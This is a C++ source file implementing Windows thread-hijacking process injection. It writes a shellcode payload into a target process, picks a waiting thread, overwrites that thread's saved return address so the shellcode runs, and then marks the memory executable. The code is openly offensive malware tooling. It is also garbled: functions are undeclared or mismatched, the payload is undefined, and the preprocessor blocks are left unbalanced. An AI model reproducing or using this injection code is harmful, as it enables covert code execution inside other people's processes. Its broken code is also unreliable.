#include <windows.h>
#include <psapi.h>

#include <string>
#include <string_view>

#include <iostream>
#include <cstdio>
#include <sstream>

#include "ntdll_api.h"
#include "ntddk.h"

#define DEBUG

/*
Example how to use below:
-----------------------------
#ifdef DEBUG
    std::cout << "Debugging information: Program is running smoothly." << std::endl;
    #endif
-----------------------------
*/

//do the work
bool run_thread_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason);
bool execute_injection(DWORD processID);


//double-check success of injection
bool is_injected();

//resuming to legitimate modules
bool get_ret_target(LPVOID ret);

bool execute_injection(DWORD processID) {
    LPVOID shellcodePtr = NULL;

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) return false;

        shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CloseHandle(hProcess);
        if (!shellcodePtr) return false;
    }

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
        if (!hProcess) return false;

        SIZE_T written = 0;
        bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &written);
        CloseHandle(hProcess);
        if (!isOk) return false;
    }
    return run_thread_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
}

bool run_thread_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason) {
#ifdef DEBUG
    std::cout << "Enumerating threads of PID: " << pid << "\n";
#endif
    std::map<DWORD, thread_info> threads_info;
    if (!pesieve::util::fetch_threads_info(pid, threads_info)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    CONTEXT ctx = { 0 };
    ULONGLONG suitable_ret_ptr = 0;
    ULONGLONG suitable_ret = 0;
#ifdef DEBUG
    std::cout << "Threads: " << threads_info.size() << std::endl;
#endif
    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
        thread_info& info = itr->second;

        if (!info.is_extended) return false;

        if (info.ext.state == Waiting) {
#ifdef DEBUG
            std::cout << "TID: " << info.tid << std::hex << " : wait reason: " << std::dec << info.ext.wait_reason << "\n";
#endif
            if (info.ext.wait_reason != wait_reason || !read_context(info.tid, ctx)) {
                continue;
            }
            ULONGLONG ret = read_return_ptr<ULONGLONG>(hProcess, ctx.Rsp);
#ifdef DEBUG
            std::cout << "RET: " << std::hex << ret << "\n";
#endif
            if (!suitable_ret_ptr) {
                if (!check_ret_target((LPVOID)ret)) {
#ifdef DEBUG
                    std::cout << "Not supported ret target. Skipping!\n";
#endif
                    continue;
                }
                suitable_ret_ptr = ctx.Rsp;
                suitable_ret = ret;
#ifdef DEBUG
                std::cout << "\tUsing as a target!\n";
#endif
                break;
            }
        }
        else {
#ifdef DEBUG
            std::cout << "TID: " << itr->first << "is NOT waiting, State: " << info.ext.state << "\n";
#endif
        }
    }
    bool is_injected = false;
    if (suitable_ret_ptr) {
        // overwrite the shellcode with the jump back
        SIZE_T written = 0;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &suitable_ret, sizeof(suitable_ret), &written) && written == sizeof(suitable_ret)) {
#ifdef DEBUG
            std::cout << "Shellcode ptr overwritten! Written: " << written << " \n";
#endif
        }
        else {
#ifdef DEBUG
            std::cout << "Failed to overwrite shellcode jmp back: " << std::hex << GetLastError() << "\n";
#endif
            return false;
        }
        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
#ifdef DEBUG
            std::cerr << "Failed making memory executable!\n";
#endif
            return false;
        }

        shellcodePtr += 0x8; // after the saved return...
#ifdef DEBUG
        std::cout << "Trying to overwrite: " << std::hex << suitable_ret_ptr << " -> " << suitable_ret << " with: " << shellcodePtr << std::endl;
#endif
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &shellcodePtr, sizeof(shellcodePtr), &written) && written == sizeof(shellcodePtr)) {
#ifdef DEBUG
            std::cout << "Ret overwritten!\n";
#endif
            is_injected = true;
        }
    }
    CloseHandle(hProcess);
    return is_injected;
}
bool get_ret_target(LPVOID ret) {
    HMODULE mod = get_module_by_address((LPVOID)ret);
    if (mod == NULL) {
#ifdef DEBUG
        std::cout << "Pointer not in any recognized module.\n";
#endif
        return false;
    }
    if (mod == GetModuleHandleA("ntdll.dll") ||
        mod == GetModuleHandleA("kernelbase.dll") ||
        mod == GetModuleHandleA("kernel32.dll"))
    {
        return true;
    }
#ifdef DEBUG
    std::cout << "Pointer not in ntdll/kernel32.\n";
#ifdef DEBUG
    return false;
}